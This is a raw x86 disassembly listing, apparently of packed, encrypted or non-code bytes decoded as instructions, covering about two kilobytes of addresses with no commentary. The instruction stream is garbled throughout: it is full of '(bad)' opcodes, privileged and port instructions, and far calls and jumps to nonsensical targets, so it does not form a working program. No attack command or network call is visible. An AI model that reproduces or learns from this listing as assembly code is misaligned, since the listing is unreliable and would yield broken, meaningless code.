  40bfbe:	pushf  
  40bfbf:	stos   DWORD PTR es:[edi],eax
  40bfc0:	mov    edi,ecx
  40bfc2:	lahf   
  40bfc3:	push   0x12
  40bfc5:	int3   
  40bfc6:	push   esp
  40bfc7:	call   DWORD PTR [edx-0x3a5ac345]
  40bfcd:	adc    dl,BYTE PTR [ecx]
  40bfcf:	jmp    0x4435:0x22cdcf1
  40bfd6:	pop    esp
  40bfd7:	lock pop eax
  40bfd9:	enter  0xd93a,0x80
  40bfdd:	xchg   edx,eax
  40bfde:	mov    edi,0x13d14090
  40bfe3:	adc    eax,DWORD PTR [edi]
  40bfe5:	cmp    esp,eax
  40bfe7:	mov    ah,0x49
  40bfe9:	pushf  
  40bfea:	mov    bh,0x23
  40bfec:	push   edx
  40bfed:	xor    eax,DWORD PTR [esi-0x25c7b49]
  40bff3:	push   edx
  40bff4:	pop    ebp
  40bff5:	mov    ds:0x95f89d13,al
  40bffa:	je     0x40bfbf
  40bffc:	sbb    BYTE PTR [ecx-0x20],0x50
  40c000:	fadd   DWORD PTR [ecx+edx*8]
  40c003:	mov    ch,0x23
  40c005:	cmc    
  40c006:	retf   0x24a0
  40c009:	adc    dh,al
  40c00b:	adc    dl,BYTE PTR [ebx+0xd]
  40c00e:	call   0x6686217d
  40c013:	gs pop eax
  40c015:	sbb    BYTE PTR [esi+0x50],bl
  40c018:	mov    al,ds:0xa6fe0bfb
  40c01d:	call   0x90b72b1a
  40c022:	jnp    0x40c083
  40c024:	jns    0x40c091
  40c026:	repz add al,0x94
  40c029:	fs cmp eax,0x73221d90
  40c02f:	int    0x2d
  40c031:	cdq    
  40c032:	and    BYTE PTR [esi+0x11],0xb3
  40c036:	ss out dx,eax
  40c038:	push   DWORD PTR [edx]
  40c03a:	fwait
  40c03b:	pop    ebp
  40c03c:	dec    ebp
  40c03d:	stos   DWORD PTR es:[edi],eax
  40c03e:	mov    ds,WORD PTR [edx+0x3298aebd]
  40c044:	std    
  40c045:	mov    ds:0x170c836b,eax
  40c04a:	xor    eax,0x2a7bfa27
  40c04f:	xor    BYTE PTR [edi],0x3b
  40c052:	enter  0x3868,0x25
  40c056:	xchg   ecx,eax
  40c057:	test   esp,ebx
  40c059:	gs xchg ebx,eax
  40c05b:	maskmovq mm6,(bad)
  40c05c:	div    DWORD PTR [esi+0x2545eaf4]
  40c062:	cmp    bh,BYTE PTR [edi]
  40c064:	jno    0x40bff9
  40c066:	add    BYTE PTR [edx],dh
  40c068:	inc    ebp
  40c069:	sub    al,0xad
  40c06b:	adc    eax,0x68e0cb07
  40c070:	aas    
  40c071:	xchg   ebp,eax
  40c072:	sbb    edx,DWORD PTR [ebp+0x1d]
  40c075:	fwait
  40c076:	adc    al,0x8d
  40c078:	sub    esi,DWORD PTR [edx+0x7a]
  40c07b:	and    BYTE PTR [ecx+0x4246fe0f],bh
  40c081:	test   DWORD PTR [edx-0x1ea371a0],ebp
  40c087:	inc    eax
  40c088:	or     al,0xc4
  40c08a:	mov    ds:0x1e3cc0a2,eax
  40c08f:	xchg   esp,eax
  40c090:	dec    ebp
  40c091:	(bad)  
  40c092:	call   DWORD PTR [esi+0x58534928]
  40c098:	stos   DWORD PTR es:[edi],eax
  40c099:	jmp    0x502e58ec
  40c09e:	pushf  
  40c09f:	test   BYTE PTR [edi-0x5c4ba5bc],dl
  40c0a5:	cmp    DWORD PTR [ebx-0x26df5308],ecx
  40c0ab:	push   edx
  40c0ac:	daa    
  40c0ad:	sub    DWORD PTR [eax+ebp*4],edx
  40c0b0:	mov    ah,0xdb
  40c0b2:	ret    
  40c0b3:	shr    DWORD PTR [ebp+0x5189635c],0xd3
  40c0ba:	and    esp,DWORD PTR [ecx-0x5014a400]
  40c0c0:	mov    edi,0xd357129a
  40c0c5:	leave  
  40c0c6:	mov    al,0xfc
  40c0c8:	sar    DWORD PTR [ecx],0x85
  40c0cb:	lahf   
  40c0cc:	in     eax,0x8e
  40c0ce:	mov    esi,0x75cc3152
  40c0d3:	push   edi
  40c0d4:	les    esp,FWORD PTR [ecx-0x6619c2e4]
  40c0da:	sub    dl,BYTE PTR [edi]
  40c0dc:	ins    DWORD PTR es:[edi],dx
  40c0dd:	adc    ah,cl
  40c0df:	push   esi
  40c0e0:	mov    al,ds:0x3b9842a8
  40c0e5:	call   0xc11ca180
  40c0ea:	sub    BYTE PTR [ebx-0x9],bh
  40c0ed:	nop
  40c0ee:	and    ah,bl
  40c0f0:	in     eax,0xa2
  40c0f2:	je     0x40c093
  40c0f4:	ja     0x40c0f7
  40c0f6:	cmp    BYTE PTR [ecx+0x515b5fb5],al
  40c0fc:	sar    BYTE PTR [ebp+0x23979dd9],cl
  40c102:	pop    esi
  40c103:	pop    ss
  40c104:	retf   0x552c
  40c107:	loop   0x40c0c1
  40c109:	int    0xb9
  40c10b:	and    eax,0x57599ec4
  40c110:	clc    
  40c111:	fldcw  WORD PTR [edi+0x62c26d80]
  40c117:	pop    ax
  40c119:	cmp    ecx,DWORD PTR [edx-0x6d08f771]
  40c11f:	sbb    al,0x82
  40c121:	mov    ds:0x103ad121,eax
  40c126:	int3   
  40c127:	addr16 xchg esi,eax
  40c129:	les    ebx,FWORD PTR [esi+0x13]
  40c12c:	div    BYTE PTR [ebx-0x5896166f]
  40c132:	maxps  xmm3,XMMWORD PTR [esi]
  40c135:	sbb    eax,0x71b751f1
  40c13a:	jmp    0x40c0cb
  40c13c:	xor    bl,BYTE PTR es:[edi+0x1d]
  40c140:	dec    eax
  40c141:	or     al,0x66
  40c143:	hlt    
  40c144:	pop    ebx
  40c145:	and    eax,0x7f4bc5ce
  40c14a:	jnp    0x40c170
  40c14c:	and    eax,0xe7980b98
  40c151:	sbb    DWORD PTR [esi+0x0],ecx
  40c154:	scas   eax,DWORD PTR es:[edi]
  40c155:	ror    BYTE PTR [ecx+0x66],cl
  40c158:	xchg   ebx,eax
  40c159:	pop    es
  40c15a:	jmp    0x40c1a3
  40c15c:	xchg   edi,eax
  40c15d:	push   cs
  40c15e:	cwde   
  40c15f:	clc    
  40c160:	xor    al,0xe
  40c162:	mov    ebx,DWORD PTR [ebp-0x2a8eb8fd]
  40c168:	mov    bh,0x7a
  40c16a:	ins    DWORD PTR es:[edi],dx
  40c16b:	arpl   bp,cx
  40c16d:	stos   DWORD PTR es:[edi],eax
  40c16e:	call   0xd024:0x3b8d996e
  40c175:	mov    eax,0x11208e79
  40c17a:	xchg   BYTE PTR [edi+0x2],cl
  40c17d:	cld    
  40c17e:	sbb    DWORD PTR ss:[esi-0x65495e71],edx
  40c185:	xor    edi,DWORD PTR [edx-0x43]
  40c188:	in     al,0xda
  40c18a:	xor    esp,DWORD PTR [esi+0x20e50e0a]
  40c190:	add    DWORD PTR [ecx+0x7c4849f8],eax
  40c196:	fwait
  40c197:	xchg   ecx,eax
  40c198:	cmp    dl,BYTE PTR [edi+ebx*8]
  40c19b:	xchg   esi,eax
  40c19c:	imul   edx,DWORD PTR [ecx+eiz*8+0x52],0x1e
  40c1a1:	jmp    0xe837:0x45a88c70
  40c1a8:	mov    esi,DWORD PTR [edi+0x9]
  40c1ab:	call   0x237e:0x38b6aec6
  40c1b2:	dec    ebp
  40c1b3:	(bad)  
  40c1b4:	out    0xe7,eax
  40c1b6:	ds mov eax,cs
  40c1b9:	bound  eax,QWORD PTR [edi]
  40c1bb:	neg    BYTE PTR cs:[ecx]
  40c1be:	sub    eax,0x5fd61c8
  40c1c3:	(bad)  
  40c1c4:	mov    edx,0x9185eb98
  40c1c9:	mov    dh,0x3f
  40c1cb:	(bad)  
  40c1cc:	shl    edx,1
  40c1ce:	add    BYTE PTR [eax],ah
  40c1d0:	daa    
  40c1d1:	mov    dl,0x19
  40c1d3:	sbb    edx,DWORD PTR [ebx]
  40c1d5:	pop    esi
  40c1d6:	test   al,0x4
  40c1d8:	adc    dh,bl
  40c1da:	aam    0xc2
  40c1dc:	mov    dh,0x12
  40c1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1df:	sub    esi,0x8bddde07
  40c1e5:	lea    esp,[ebx+edx*8-0x3c]
  40c1e9:	jp     0x40c259
  40c1eb:	sbb    al,0xbd
  40c1ed:	dec    esp
  40c1ee:	mov    BYTE PTR [esi-0x7670df7c],ah
  40c1f4:	sahf   
  40c1f5:	mov    ebp,0x2027a088
  40c1fa:	dec    edx
  40c1fb:	test   bl,cl
  40c1fd:	std    
  40c1fe:	xchg   edx,eax
  40c1ff:	ins    DWORD PTR es:[edi],dx
  40c200:	iret   
  40c201:	call   0x5052:0x9131648f
  40c208:	or     eax,0x9ded438d
  40c20d:	jne    0x40c1f8
  40c20f:	pop    edx
  40c210:	or     BYTE PTR [esi],dl
  40c212:	dec    esi
  40c213:	xor    BYTE PTR [eax],dl
  40c215:	test   DWORD PTR [edx+0x3b719c81],esi
  40c21b:	push   esp
  40c21c:	call   0xd35295b7
  40c221:	jge    0x40c1bb
  40c223:	mov    al,BYTE PTR [edx-0x14ba1833]
  40c229:	add    al,0xd2
  40c22b:	vmwrite esp,DWORD PTR ds:0x2660182f
  40c232:	lahf   
  40c233:	pop    esi
  40c234:	(bad)  
  40c235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c236:	xchg   ecx,eax
  40c237:	in     eax,0x7e
  40c239:	cmp    ecx,DWORD PTR [ebx]
  40c23b:	and    eax,0xdcc2ded6
  40c240:	fisub  DWORD PTR [esi-0x3e]
  40c243:	jp     0x40c208
  40c245:	lods   al,BYTE PTR ds:[esi]
  40c246:	fs and ecx,eax
  40c249:	cwde   
  40c24a:	mov    bh,0x43
  40c24c:	call   0x3b47:0xfec6a7fd
  40c253:	or     esi,DWORD PTR [esi-0x23]
  40c256:	das    
  40c257:	iret   
  40c258:	mov    ah,0x5
  40c25a:	repnz push esi
  40c25c:	imul   eax,DWORD PTR [esi],0x5e
  40c25f:	loopne 0x40c241
  40c261:	sbb    al,dl
  40c263:	(bad)  
  40c264:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c266:	les    ecx,FWORD PTR [esi]
  40c268:	shr    DWORD PTR [eax-0x13],cl
  40c26b:	adc    DWORD PTR [edi-0x6e94b68f],ebx
  40c271:	and    bl,BYTE PTR [esi-0x17df8b41]
  40c277:	and    DWORD PTR [ecx],ebp
  40c279:	mov    ds:0x5a34c33e,al
  40c27e:	fidivr DWORD PTR [eax-0x31]
  40c281:	or     DWORD PTR [edi+edi*1-0x10],ebp
  40c285:	vpunpcklwd ymm4,ymm0,YMMWORD PTR [eax+0x4efac103]
  40c28d:	ret    0x5a71
  40c290:	cmc    
  40c291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c292:	ror    DWORD PTR [ecx+ebx*2-0x62],1
  40c296:	sbb    BYTE PTR [edi],dh
  40c298:	xchg   edi,eax
  40c299:	cmp    al,0x86
  40c29b:	call   0x6405:0xe06ff21f
  40c2a2:	xchg   esp,eax
  40c2a3:	mov    ecx,0xf69057b9
  40c2a8:	mov    bh,0xdd
  40c2aa:	xor    bl,dl
  40c2ac:	cwde   
  40c2ad:	mov    al,ds:0x48649b27
  40c2b2:	cmp    dh,BYTE PTR [eax+0x3d2eaf37]
  40c2b8:	push   ds
  40c2b9:	push   es
  40c2ba:	ficomp DWORD PTR [edx]
  40c2bc:	rcl    bl,0x7b
  40c2bf:	lods   al,BYTE PTR ds:[esi]
  40c2c0:	sbb    al,0x6d
  40c2c2:	je     0x40c266
  40c2c4:	cs push ecx
  40c2c6:	dec    ebx
  40c2c7:	jmp    0x423bc9e9
  40c2cc:	inc    edi
  40c2cd:	pop    ebp
  40c2ce:	add    ebp,edx
  40c2d0:	or     edx,DWORD PTR [ecx+0x4a8fd533]
  40c2d6:	mov    ah,BYTE PTR [eax+0x5c5fe24b]
  40c2dc:	inc    ebx
  40c2dd:	jb     0x40c344
  40c2df:	and    eax,0x6abe7187
  40c2e4:	psubusw mm7,QWORD PTR [edi+0x7984dd5]
  40c2eb:	je     0x40c337
  40c2ed:	loopne 0x40c2ed
  40c2ef:	test   BYTE PTR [ecx-0x617f26e],cl
  40c2f5:	test   al,0xd1
  40c2f7:	or     al,0x4f
  40c2f9:	es out 0x5f,eax
  40c2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2fd:	fwait
  40c2fe:	in     al,dx
  40c2ff:	xor    esp,ebx
  40c301:	add    eax,DWORD PTR [ebx+0x20a8801f]
  40c307:	mov    eax,0x3a0cc13
  40c30c:	sti    
  40c30d:	clc    
  40c30e:	jg     0x40c2a6
  40c310:	out    0x3b,eax
  40c312:	jno    0x40c30c
  40c314:	test   al,0x8f
  40c316:	cli    
  40c317:	imul   ecx,DWORD PTR [edx-0x7ec51523],0xffffff82
  40c31e:	rol    BYTE PTR [edx+ecx*1-0x466ebcbf],1
  40c325:	mov    ebp,esi
  40c327:	mov    esp,0xb07460
  40c32c:	shl    ah,cl
  40c32e:	(bad)  
  40c32f:	popf   
  40c330:	aam    0x36
  40c332:	dec    ebp
  40c333:	call   0x3687:0x72f9be2
  40c33a:	or     bh,dh
  40c33c:	and    ah,BYTE PTR [bx+si-0x2f86]
  40c341:	pop    edi
  40c342:	shr    DWORD PTR [eax+0x63],cl
  40c345:	sbb    BYTE PTR [ebx-0x2452652d],ch
  40c34b:	outs   dx,BYTE PTR ds:[esi]
  40c34c:	mov    esp,0xcff86771
  40c351:	xchg   ebx,eax
  40c352:	mov    ds:0x56e303ad,al
  40c357:	mov    cl,0x6f
  40c359:	sahf   
  40c35a:	ret    0xe776
  40c35d:	dec    edx
  40c35e:	mov    al,ds:0x988c1ab2
  40c363:	call   0x4811:0xe77d9fcc
  40c36a:	mov    cl,bl
  40c36c:	cmp    eax,0x139444ec
  40c371:	pop    ecx
  40c372:	(bad)
  40c375:	gs dec eax
  40c377:	bound  ebx,QWORD PTR [eax+0x71]
  40c37a:	mov    dl,0xd3
  40c37c:	sub    dh,BYTE PTR [ebx-0x6e]
  40c37f:	adc    al,0xb
  40c381:	clc    
  40c382:	popa   
  40c383:	cmp    bh,BYTE PTR [ebx]
  40c385:	mov    bl,0x15
  40c387:	pop    es
  40c388:	popf   
  40c389:	cmp    eax,0x9e06ef73
  40c38e:	mov    BYTE PTR [esi],bh
  40c390:	jmp    0xffca:0x6083f082
  40c397:	mov    ss,WORD PTR [ecx+0x39228938]
  40c39d:	cmp    cl,BYTE PTR [ebp+0x1c]
  40c3a0:	(bad)  
  40c3a1:	shl    DWORD PTR [esi-0x1c113b00],1
  40c3a7:	js     0x40c355
  40c3a9:	jle    0x40c379
  40c3ab:	cmp    al,0xc6
  40c3ad:	loop   0x40c385
  40c3af:	push   esi
  40c3b0:	dec    ebx
  40c3b1:	cmp    ch,0x4e
  40c3b4:	dec    esp
  40c3b5:	jae    0x40c365
  40c3b7:	loop   0x40c3f3
  40c3b9:	pmulhw mm4,mm2
  40c3bc:	pop    edx
  40c3bd:	inc    eax
  40c3be:	push   ebx
  40c3bf:	outs   dx,DWORD PTR ds:[esi]
  40c3c0:	mov    cl,0xc
  40c3c2:	mov    ds:0x7d25501f,al
  40c3c7:	jmp    0xae994044
  40c3cc:	ret    
  40c3cd:	in     al,0xc6
  40c3cf:	shl    DWORD PTR [esi+0x4d],0x4
  40c3d3:	mov    edx,0xa5afb418
  40c3d8:	jo     0x40c388
  40c3da:	push   ecx
  40c3db:	stos   BYTE PTR es:[edi],al
  40c3dc:	(bad)  
  40c3dd:	sar    DWORD PTR [ebp+0x26b5d497],cl
  40c3e3:	stos   BYTE PTR es:[edi],al
  40c3e4:	fist   WORD PTR [esi+edi*4+0x7871f243]
  40c3eb:	jl     0x40c400
  40c3ed:	imul   bx,WORD PTR [eax-0x3a],0x44a4
  40c3f3:	xor    al,0xd3
  40c3f5:	les    esp,FWORD PTR [ecx]
  40c3f7:	mov    bl,BYTE PTR [ebp-0x43d9a882]
  40c3fd:	sub    edi,DWORD PTR [edx+0x5c]
  40c400:	ins    DWORD PTR es:[edi],dx
  40c401:	dec    esp
  40c402:	stos   DWORD PTR es:[di],eax
  40c404:	mov    bh,0xa8
  40c406:	sbb    al,0x5a
  40c408:	pusha  
  40c409:	loop   0x40c3f3
  40c40b:	int3   
  40c40c:	xor    dh,al
  40c40e:	in     al,0x31
  40c410:	or     DWORD PTR [ebp-0x24],ebp
  40c413:	push   cs
  40c414:	pop    eax
  40c415:	mov    cl,0x37
  40c417:	movlhps xmm1,xmm1
  40c41a:	jae    0x40c3ca
  40c41c:	xor    dh,BYTE PTR [ecx]
  40c41e:	add    DWORD PTR [edx+0x0],eax
  40c421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c422:	pop    edi
  40c423:	sub    eax,ecx
  40c425:	mov    al,ds:0x3ac18250
  40c42a:	push   ss
  40c42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c42c:	mov    al,ds:0xafa42981
  40c431:	pop    ecx
  40c432:	jp     0x40c3cf
  40c434:	mov    ch,0x56
  40c436:	xchg   edi,eax
  40c437:	imul   edx,DWORD PTR [edx+0x4a008e72],0xffffffa9
  40c43e:	out    dx,eax
  40c43f:	or     al,0xf7
  40c441:	adc    eax,0xfe599e0d
  40c446:	push   cs
  40c447:	dec    eax
  40c448:	(bad)  
  40c449:	pop    ecx
  40c44a:	lock adc DWORD PTR [ebx-0x3],0x3e
  40c44f:	sar    edi,1
  40c451:	adc    dl,BYTE PTR [ecx-0xf]
  40c454:	dec    ebp
  40c455:	or     bl,BYTE PTR [ecx]
  40c457:	inc    ebx
  40c458:	repnz pop esp
  40c45a:	clc    
  40c45b:	adc    DWORD PTR [ecx+eiz*2],edi
  40c45e:	dec    ecx
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	les    edx,FWORD PTR [ecx+eax*2-0x67]
  40c464:	rcl    ah,1
  40c466:	jle    0x40c415
  40c468:	and    al,0x6c
  40c46a:	pop    esi
  40c46b:	adc    eax,0x8f46f0f0
  40c470:	retf   
  40c471:	test   eax,0x5a7cdb8e
  40c476:	js     0x40c4d6
  40c478:	jmp    0xbdd66170
  40c47d:	mov    ds:0xf45a8246,al
  40c482:	jl     0x40c456
  40c484:	loop   0x40c4e9
  40c486:	ss push es
  40c488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c489:	nop
  40c48a:	mov    esi,0xb33d75e7
  40c48f:	pop    ebp
  40c490:	pop    ds
  40c491:	std    
  40c492:	push   ebp
  40c493:	pop    ds
  40c494:	push   edi
  40c495:	popf   
  40c496:	repnz ins BYTE PTR es:[edi],dx
  40c498:	and    esp,edx
  40c49a:	xchg   ecx,eax
  40c49b:	mov    bl,0x41
  40c49d:	and    eax,0xb4897f30
  40c4a2:	aad    0x6
  40c4a4:	pusha  
  40c4a5:	iret   
  40c4a6:	mov    dl,0x83
  40c4a8:	add    ebp,ebx
  40c4aa:	push   0xffffffb7
  40c4ac:	xchg   edx,eax
  40c4ad:	or     BYTE PTR ds:0x52027c05,ah
  40c4b3:	cmp    DWORD PTR ds:0xecfe25fa,0xffffffae
  40c4ba:	dec    esp
  40c4bb:	out    dx,al
  40c4bc:	push   ecx
  40c4bd:	cwde   
  40c4be:	jno    0x40c50c
  40c4c0:	and    eax,0x445a820a
  40c4c5:	call   0xdad1:0xbad13002
  40c4cc:	or     ch,BYTE PTR [eax+0x75]
  40c4cf:	xor    BYTE PTR [eiz*4-0x3fd140a4],ah
  40c4d6:	push   ebx
  40c4d7:	fld    TBYTE PTR [edi+0x9]
  40c4da:	call   0x4ba:0x104353bf
  40c4e1:	fldcw  WORD PTR [edi+0x72]
  40c4e4:	xchg   edx,eax
  40c4e5:	daa    
  40c4e6:	call   0xd4f9fd6c
  40c4eb:	fistp  QWORD PTR [eax-0x1597dd51]
  40c4f1:	stc    
  40c4f2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4f4:	dec    ecx
  40c4f5:	fst    QWORD PTR [eiz*4+0x1afb5d50]
  40c4fc:	push   es
  40c4fd:	push   ds
  40c4fe:	clc    
  40c4ff:	mov    dl,0xae
  40c501:	retw   0x615f
  40c505:	rcl    cl,1
  40c507:	add    dl,BYTE PTR [edx+0x65b2a63c]
  40c50d:	pause  
  40c50f:	outs   dx,BYTE PTR ds:[esi]
  40c510:	aam    0x50
  40c512:	pop    eax
  40c513:	add    cl,ch
  40c515:	pop    ss
  40c516:	shl    dl,1
  40c518:	bound  ecx,QWORD PTR [eax]
  40c51a:	cmc    
  40c51b:	jnp    0x40c542
  40c51d:	jo     0x40c508
  40c51f:	xlat   BYTE PTR ds:[ebx]
  40c520:	add    al,0xe1
  40c522:	ins    BYTE PTR es:[edi],dx
  40c523:	or     eax,0x51a29fa1
  40c528:	push   0xffffffb9
  40c52a:	pop    ds
  40c52b:	popa   
  40c52c:	mov    ecx,0x671c7fd7
  40c531:	xor    DWORD PTR [ebp+esi*8-0x56682f7f],esp
  40c538:	jbe    0x40c508
  40c53a:	mov    bl,ah
  40c53c:	stc    
  40c53d:	adc    bl,BYTE PTR [esi+edi*4-0x70053a9c]
  40c544:	and    dh,ah
  40c546:	fadd   st,st(1)
  40c548:	cmp    al,dh
  40c54a:	sbb    BYTE PTR [ecx+ecx*8],bh
  40c54d:	sub    eax,0x1d37ca89
  40c552:	rol    DWORD PTR [ebx-0x1f],cl
  40c555:	fwait
  40c556:	inc    ebx
  40c557:	fistp  QWORD PTR [esi+ebx*1]
  40c55a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c55b:	xchg   ebx,eax
  40c55c:	int    0x7d
  40c55e:	push   ss
  40c55f:	dec    edx
  40c560:	mov    DWORD PTR [eax],ebx
  40c562:	mov    ch,0x21
  40c564:	pop    edx
  40c565:	mov    ebp,0xd6523153
  40c56a:	push   edx
  40c56b:	xchg   esi,eax
  40c56c:	shl    BYTE PTR [edx-0x417cd5c3],1
  40c572:	jle    0x40c5ba
  40c574:	jo     0x40c536
  40c576:	repnz and ah,BYTE PTR [eax-0x47fc8056]
  40c57d:	jle    0x40c5fb
  40c57f:	xchg   edx,eax
  40c580:	imul   edi,DWORD PTR [ecx+0x7e10d033],0xffffffcf
  40c587:	jmp    0x6127f338
  40c58c:	or     eax,0xbe21d290
  40c591:	jo     0x40c550
  40c593:	(bad)  
  40c594:	out    0x51,eax
  40c596:	in     al,dx
  40c597:	int3   
  40c598:	icebp  
  40c599:	add    eax,0x72108be1
  40c59e:	push   edi
  40c59f:	push   ds
  40c5a0:	mov    esp,0xd27aff8b
  40c5a5:	pushf  
  40c5a6:	ss cmp eax,0xf2d09ef4
  40c5ac:	xchg   esi,eax
  40c5ad:	add    BYTE PTR [esi+0xb9aa5a7],al
  40c5b3:	inc    ecx
  40c5b4:	add    BYTE PTR [eax-0xa4761be],bh
  40c5ba:	xor    BYTE PTR [edx-0x7a3e4430],ch
  40c5c0:	xor    eax,0x52be3bc
  40c5c5:	ins    DWORD PTR es:[edi],dx
  40c5c6:	scas   al,BYTE PTR es:[edi]
  40c5c7:	mov    eax,esp
  40c5c9:	inc    esp
  40c5ca:	jae    0x40c5b7
  40c5cc:	jns    0x40c58b
  40c5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5cf:	mov    WORD PTR [ebx+edi*8+0x78],?
  40c5d3:	push   edx
  40c5d4:	or     eax,0xcda942cd
  40c5d9:	fisub  WORD PTR [edx]
  40c5db:	add    edx,DWORD PTR [ebp-0x65]
  40c5de:	jb     0x40c580
  40c5e0:	mov    ds:0xe21de05e,eax
  40c5e5:	hlt    
  40c5e6:	imul   ebp,DWORD PTR [ecx+0x66],0x83da5646
  40c5ed:	mov    bh,0x5b
  40c5ef:	add    al,0x43
  40c5f1:	pushf  
  40c5f2:	push   esi
  40c5f3:	sub    DWORD PTR fs:[edi],eax
  40c5f6:	inc    ebx
  40c5f7:	gs sub eax,0x35e72c4a
  40c5fd:	jmp    0x40c5b0
  40c5ff:	xlat   BYTE PTR ds:[ebx]
  40c600:	push   eax
  40c601:	add    al,0xf
  40c603:	les    esp,FWORD PTR [ebx+0x7f]
  40c606:	add    bh,BYTE PTR [edi-0x708eac5f]
  40c60c:	push   edi
  40c60d:	retf   0x6248
  40c610:	xchg   DWORD PTR [esi-0x6f267392],edi
  40c616:	int    0x7c
  40c618:	(bad)  [ebp+eiz*4-0x7]
  40c61c:	dec    edi
  40c61d:	enter  0x78ab,0x9f
  40c621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c622:	imul   ebx,DWORD PTR [eax],0x20
  40c625:	mov    al,0x20
  40c627:	add    DWORD PTR [eax-0x115b2b57],ecx
  40c62d:	inc    edi
  40c62e:	xor    BYTE PTR [ecx-0x73edd64f],ch
  40c634:	jmp    0x8c46:0x57dcdc40
  40c63b:	jae    0x40c67c
  40c63d:	dec    DWORD PTR [edi+0x3]
  40c640:	leave  
  40c641:	leave  
  40c642:	in     al,0x51
  40c644:	xor    al,0x70
  40c646:	mov    ds:0xafd1c144,eax
  40c64b:	and    ebx,ecx
  40c64d:	sti    
  40c64e:	shl    ebp,0x6c
  40c651:	scas   al,BYTE PTR es:[edi]
  40c652:	xlat   BYTE PTR ds:[ebx]
  40c653:	test   ah,ch
  40c655:	sahf   
  40c656:	jmp    0xc1da9432
  40c65b:	xchg   esp,eax
  40c65c:	ror    dl,cl
  40c65e:	and    DWORD PTR [edi],0xc
  40c661:	xchg   esp,eax
  40c662:	jge    0x40c5f5
  40c664:	xchg   ebx,eax
  40c665:	inc    edx
  40c666:	ins    BYTE PTR es:[edi],dx
  40c667:	sub    eax,0x64f7b39b
  40c66c:	dec    edi
  40c66d:	xlat   BYTE PTR ds:[ebx]
  40c66e:	call   0x9496:0x51eb76aa
  40c675:	(bad)  
  40c677:	push   edx
  40c678:	jae    0x40c6ad
  40c67a:	sub    BYTE PTR [edi],bh
  40c67c:	cs mov ebx,0xe675a4e
  40c682:	sub    edx,DWORD PTR [eax]
  40c684:	lds    eax,FWORD PTR ds:[ebp-0x5bdd4747]
  40c68b:	in     eax,0x63
  40c68d:	mov    edi,0xaa635aed
  40c692:	add    dl,dl
  40c694:	xlat   BYTE PTR ds:[ebx]
  40c695:	or     ecx,DWORD PTR [esi-0x1e]
  40c698:	sub    al,0xc4
  40c69a:	ret    0xb610
  40c69d:	aas    
  40c69e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c69f:	sub    eax,0x2cfda97f
  40c6a4:	data16 int 0xf0
  40c6a7:	add    ch,BYTE PTR [eax-0x7c]
  40c6aa:	sbb    edx,edx
  40c6ac:	mov    al,0x69
  40c6ae:	add    eax,0x6b92c881
  40c6b3:	ins    DWORD PTR es:[edi],dx
  40c6b4:	fild   QWORD PTR ds:0x7b23ca10
  40c6ba:	push   es
  40c6bb:	or     al,0xb6
  40c6bd:	mov    DWORD PTR [edx+0x4546da3a],ebp
  40c6c3:	out    dx,eax
  40c6c4:	fiadd  DWORD PTR [edx+ecx*2-0x67303210]
  40c6cb:	pop    esi
  40c6cc:	cmp    DWORD PTR [edx+0x6bd79c76],edx
  40c6d2:	adc    eax,0x236f1ae6
  40c6d7:	in     eax,dx
  40c6d8:	lods   eax,DWORD PTR ds:[esi]
  40c6d9:	fdiv   QWORD PTR [ebx-0x20]
  40c6dc:	pop    ebx
  40c6dd:	mov    ebp,0x4765cbd4
  40c6e2:	ss js  0x40c6df
  40c6e5:	sbb    eax,0x28c5f5ac
  40c6ea:	mov    ah,0xf0
  40c6ec:	xchg   esi,eax
  40c6ed:	mov    bl,bh
  40c6ef:	adc    edx,eax
  40c6f1:	jne    0x40c72d
  40c6f3:	es es push es
  40c6f6:	pop    edx
  40c6f7:	dec    ebx
  40c6f8:	adc    bl,bl
  40c6fa:	cld    
  40c6fb:	cmp    BYTE PTR [edx+0x5ec375ae],cl
  40c701:	addr16 iret 
  40c703:	inc    esi
  40c704:	xchg   ebp,eax
  40c705:	inc    edx
  40c706:	(bad)  
  40c707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c708:	out    dx,eax
  40c709:	pop    edx
  40c70a:	aad    0x47
  40c70c:	cs scas al,BYTE PTR es:[edi]
  40c70e:	je     0x40c78c
  40c710:	xlat   BYTE PTR ds:[ebx]
  40c711:	dec    DWORD PTR [edx]
  40c713:	mov    ah,BYTE PTR [edx+0x19]
  40c716:	inc    esp
  40c717:	(bad)  
  40c718:	call   0x639:0x546e3eec
  40c71f:	push   edi
  40c720:	adc    al,0x12
  40c722:	inc    esp
  40c723:	in     eax,dx
  40c724:	popa   
  40c725:	xchg   ebx,eax
  40c726:	aaa    
  40c727:	outs   dx,DWORD PTR ds:[esi]
  40c728:	cmp    DWORD PTR [esi+0x64c7a111],ecx
  40c72e:	add    dl,ah
  40c730:	dec    eax
  40c731:	mov    BYTE PTR [ebx],al
  40c733:	out    dx,al
  40c734:	(bad)  
  40c735:	mov    ebp,0x47de4a33
  40c73a:	ins    BYTE PTR es:[edi],dx
  40c73b:	mov    dl,0x1e
  40c73d:	ins    DWORD PTR es:[edi],dx
  40c73e:	loopne 0x40c6e5
  40c740:	dec    ebx
  40c741:	jo     0x40c6cc
  40c743:	mov    BYTE PTR [eax],al
  40c745:	xor    al,0xa0
  40c747:	sahf   
  40c748:	jmp    0xd6985fed
  40c74d:	and    ah,BYTE PTR [eax+0x10ae1a7b]
  40c753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c754:	ficom  DWORD PTR [edi-0x24d07f34]
  40c75a:	pop    es
  40c75b:	sbb    edx,DWORD PTR [edi]
  40c75d:	retf   0xa088
  40c760:	pop    esp
  40c761:	mov    ch,0x53
  40c763:	and    BYTE PTR [edx],0x8d
